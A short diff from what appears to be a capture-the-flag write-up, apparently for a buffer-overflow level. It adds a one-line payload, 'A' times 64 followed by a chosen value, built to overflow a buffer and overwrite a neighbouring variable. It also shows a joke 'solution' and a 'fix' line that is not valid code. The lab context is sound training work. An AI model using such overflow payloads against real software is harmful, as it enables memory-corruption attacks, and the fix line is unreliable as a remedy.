@@ -95,6 +95,6 @@ You have successfully executed getflag on a target account
 solution:rouler sa tête sur le clavier
 fix: if(sizeof(buffer)>64)local.changeme=0;
 
-
+print("A"*64 + 'IlYb')
 
 
